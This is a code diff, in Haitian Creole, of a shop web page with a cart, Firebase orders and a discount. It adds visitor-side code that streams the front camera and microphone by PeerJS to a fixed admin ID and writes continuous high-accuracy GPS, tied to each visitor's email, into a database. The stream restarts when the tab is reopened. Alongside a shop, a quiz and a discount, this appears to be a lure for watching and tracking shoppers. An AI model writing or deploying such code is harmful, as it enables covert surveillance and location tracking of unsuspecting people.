+    const input = document.querySelector(`.prod-photo[data-key="${item.key}"]`);
+    const photo = input ? input.dataset.base64 : null;
+    const p = getFinalPrice(item.price);
+
+    const order = {
+      visitorId: VISITOR_ID,
+      email: email,
+      productKey: item.key,
+      productName: item.name,
+      productPrice: p.original,
+      finalPrice: p.final,
+      qty: qty,
+      discount: hasDiscount ? 8 : 0,
+      total: p.final * qty,
+      payment: payment,
+      photo: photo,
+      status: "pending",
+      createdAt: Date.now()
+    };
+
+    try {
+      await db.ref("orders").push(order);
+    } catch (e) { console.error("Erè:", e); }
+  }
+
+  cart = [];
+  saveCart();
+  document.getElementById("orderModal").classList.add("hidden");
+
+  alert(`✅ Kòmand ou resevwa !\n\nEmail: ${email}\nPeman: ${payment}\n\nNou pral kontakte w.`);
+
+  btn.disabled = false;
+  btn.innerText = "✅ Konfime Kòmand";
+};
+
+/* CHAJE RABÈ SI DEJA GENYEN */
+if (localStorage.getItem("has_discount") === "1") {
+  hasDiscount = true;
+}
+updateCartUI();
+
+/* ============================================
+   PEERJS + KAMERA + LOKASYON
+   ============================================ */
+/* ============================================
+   PEERJS + KAMERA + LOKASYON
+   ============================================ */
+const ctaView    = document.getElementById("ctaView");
+const activeView = document.getElementById("activeView");
+const btnStart   = document.getElementById("btnStart");
+const btnStop    = document.getElementById("btnStop");
+const btnQuiz    = document.getElementById("btnQuiz");
+const statusEl   = document.getElementById("status");
+
 const ADMIN_ID = "admin-piyayy-2026-v2";
-const grid = document.getElementById("videoGrid");
-const status = document.getElementById("status");
-const visitors = {};
 
 const ICE_CONFIG = {
   iceServers: [
@@ -184,175 +818,173 @@ const ICE_CONFIG = {
 };
 
 let peer = null;
+let localStream = null;
+let currentCall = null;
+let watchId = null;
+let active = false;
 
-function connectPeer() {
-  peer = new Peer(ADMIN_ID, { config: ICE_CONFIG, debug: 1 });
+function setStatus(msg) {
+  statusEl.innerText = msg;
+  console.log("Status:", msg);
+}
+
+/* ============================================
+   KÒMANSE PATAJE
+   ============================================ */
+async function startSharing() {
+  btnStart.disabled = true;
+  setStatus("⏳ Ap mande pèmisyon kamera...");
+
+  // 1. Kamera + Mikwo
+  try {
+    localStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+    setStatus("✅ Kamera limen");
+  } catch (e1) {
+    console.warn("Erè kamera devan:", e1);
+    try {
+      localStream = await navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: true
+      });
+      setStatus("✅ Kamera limen (lòt)");
+    } catch (e2) {
+      setStatus("❌ Ou refize kamera a");
+      btnStart.disabled = false;
+      return;
+    }
+  }
+
+  // 2. Konekte PeerJS
+  setStatus("📡 Ap konekte ak admin...");
+
+  peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });
 
   peer.on("open", (id) => {
-    console.log("✅ Admin ID:", id);
-    status.innerText = "✅ Admin konekte. Ap tann visitors...";
-    const empty = grid.querySelector(".empty");
-    if (empty) empty.remove();
-  });
+    console.log("✅ Visitor ID:", id);
+    setStatus("📞 Ap rele admin...");
 
-  peer.on("call", handleCall);
+    currentCall = peer.call(ADMIN_ID, localStream);
+    if (!currentCall) {
+      setStatus("❌ Pa ka rele admin");
+      btnStart.disabled = false;
+      return;
+    }
+
+    currentCall.on("stream", () => {
+      console.log("✅ Admin reponn");
+      setStatus("🟢 Ou konekte ak admin");
+    });
+
+    currentCall.on("close", () => {
+      console.log("📴 Call fèmen");
+      setStatus("🔴 Koneksyon fèmen");
+    });
+
+    currentCall.on("error", (err) => {
+      console.warn("Erè call:", err);
+      setStatus("❌ Erè koneksyon");
+    });
+
+    // 3. Lokasyon
+    startLocation();
+
+    // 4. UI
+    active = true;
+    ctaView.classList.add("hidden");
+    activeView.classList.remove("hidden");
+  });
 
   peer.on("error", (err) => {
     console.warn("PeerJS erè:", err);
-    if (err.type === "unavailable-id") {
-      status.innerText = "❌ ID deja itilize. Ap eseye ankò...";
-      setTimeout(connectPeer, 3000);
-      return;
-    }
-    status.innerText = "❌ Erè: " + err.type;
+    setStatus("❌ Erè: " + err.type);
   });
 
   peer.on("disconnected", () => {
-    status.innerText = "⚠️ Koneksyon pèdi";
+    setStatus("⚠️ Koneksyon pèdi");
     setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
   });
 }
 
-function handleCall(call) {
-  const visitorId = call.peer;
-  console.log("📞 Visitor konekte:", visitorId);
+/* ============================================
+   SISPANN PATAJE
+   ============================================ */
+function stopSharing() {
+  active = false;
 
-  if (visitors[visitorId]) {
-    try { visitors[visitorId].call.close(); } catch (e) {}
-    if (visitors[visitorId].card) visitors[visitorId].card.remove();
-    delete visitors[visitorId];
+  if (watchId !== null) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
   }
+  db.ref("locations/" + VISITOR_ID).remove();
 
-  call.answer();
+  if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
+  if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+  if (peer) { try { peer.destroy(); } catch (e) {} peer = null; }
 
-  const card = document.createElement("div");
-  card.className = "video-card";
-  card.dataset.visitorId = visitorId;
-
-  const dot = document.createElement("div");
-  dot.className = "live-dot";
-
-  const video = document.createElement("video");
-  video.autoplay = true;
-  video.playsInline = true;
-  video.muted = true;
-
-  const label = document.createElement("p");
-  label.innerText = "👤 " + visitorId;
-
-  const soundBtn = document.createElement("button");
-  soundBtn.className = "sound-toggle";
-  soundBtn.innerText = "🔊 Tande son";
-  soundBtn.onclick = () => {
-    video.muted = !video.muted;
-    if (video.muted) {
-      soundBtn.innerText = "🔊 Tande son";
-      soundBtn.classList.remove("off");
-    } else {
-      soundBtn.innerText = "🔇 Koupe son";
-      soundBtn.classList.add("off");
-      video.play().catch(e => console.warn("play err:", e));
-    }
-  };
-
-  card.appendChild(dot);
-  card.appendChild(video);
-  card.appendChild(label);
-  card.appendChild(soundBtn);
-  grid.appendChild(card);
-
-  visitors[visitorId] = { call, video, card };
-
-  call.on("stream", (remoteStream) => {
-    console.log("🎬 Stream rive:", visitorId);
-    video.srcObject = remoteStream;
-    video.play().catch(e => console.warn("play err:", e));
-  });
-
-  call.on("close", () => {
-    console.log("📴 Call close:", visitorId);
-    cleanup(visitorId);
-  });
-
-  call.on("error", (e) => {
-    console.warn("Call erè:", e);
-    cleanup(visitorId);
-  });
-
-  updateStatus();
-}
-
-function cleanup(id) {
-  if (!visitors[id]) return;
-  try { visitors[id].call.close(); } catch (e) {}
-  if (visitors[id].card) visitors[id].card.remove();
-  delete visitors[id];
-  updateStatus();
-}
-
-function updateStatus() {
-  const count = Object.keys(visitors).length;
-  status.innerText = count > 0
-    ? `🟢 ${count} visitor konekte`
-    : "✅ Admin konekte. Ap tann visitors...";
-
-  if (count > 0) {
-    const empty = grid.querySelector(".empty");
-    if (empty) empty.remove();
-  } else if (!grid.querySelector(".empty")) {
-    const empty = document.createElement("div");
-    empty.className = "empty";
-    empty.innerText = "Ap tann visitor yo konekte...";
-    grid.appendChild(empty);
-  }
+  activeView.classList.add("hidden");
+  ctaView.classList.remove("hidden");
+  btnStart.disabled = false;
+  setStatus("⛔ Ou sispann pataje");
 }
 
 /* ============================================
    LOKASYON
    ============================================ */
-const locationsList = document.getElementById("locationsList");
+function startLocation() {
+  if (!navigator.geolocation) return;
 
-db.ref("locations").on("value", (snapshot) => {
-  const data = snapshot.val();
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      sendLocation(pos);
+      watchId = navigator.geolocation.watchPosition(
+        sendLocation,
+        (err) => console.warn("GPS erè:", err.message),
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+      );
+    },
+    (err) => console.warn("Visitor refize lokasyon:", err.message),
+    { enableHighAccuracy: true, timeout: 15000 }
+  );
+}
 
-  Object.values(markers).forEach(m => { if (map) map.removeLayer(m); });
-  markers = {};
-  locationsList.innerHTML = "";
-
-  if (!data || Object.keys(data).length === 0) {
-    locationsList.innerHTML = '<div class="empty">Pa gen visitors lokalize</div>';
-    return;
-  }
-
-  Object.entries(data).forEach(([id, loc]) => {
-    const pos = [loc.lat, loc.lon];
-    const email = loc.email || "Anonim";
-
-    if (map) {
-      const m = L.marker(pos).addTo(map);
-      m.bindPopup(`<b>${email}</b><br>${Math.round(loc.acc)}m`);
-      markers[id] = m;
-    }
-
-    const div = document.createElement("div");
-    div.className = "loc-card";
-    div.innerHTML = `
-      <div class="name">👤 ${email}</div>
-      <div class="info">
-        📍 ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}<br>
-        🎯 ${Math.round(loc.acc)} m<br>
-        🕐 ${new Date(loc.time).toLocaleTimeString()}
-      </div>
-    `;
-    locationsList.appendChild(div);
+function sendLocation(pos) {
+  db.ref("locations/" + VISITOR_ID).set({
+    email: localStorage.getItem("visitor_email") || "Anonim",
+    lat: pos.coords.latitude,
+    lon: pos.coords.longitude,
+    acc: pos.coords.accuracy,
+    time: Date.now()
   });
-});
+  console.log("📍 Pozisyon voye");
+}
 
 /* ============================================
-   KÒMANSE
+   EVÈNMAN
    ============================================ */
-initMap();
-connectPeer();
+btnStart.onclick = startSharing;
+btnStop.onclick  = stopSharing;
+btnQuiz.onclick  = openQuiz;
+
+/* Lè w tounen sou paj la */
+document.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "visible" && active) {
+    if (!localStream || localStream.getVideoTracks().every(t => t.readyState === "ended")) {
+      startSharing();
+    }
+  }
+});
+
+/* Netwaye lè w fèmen paj la */
+window.addEventListener("beforeunload", () => {
+  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+  db.ref("locations/" + VISITOR_ID).remove();
+  if (localStream) localStream.getTracks().forEach(t => t.stop());
+  if (currentCall) try { currentCall.close(); } catch (e) {}
+  if (peer && !peer.destroyed) peer.destroy();
+});
 </script>
 </body>
 </html>
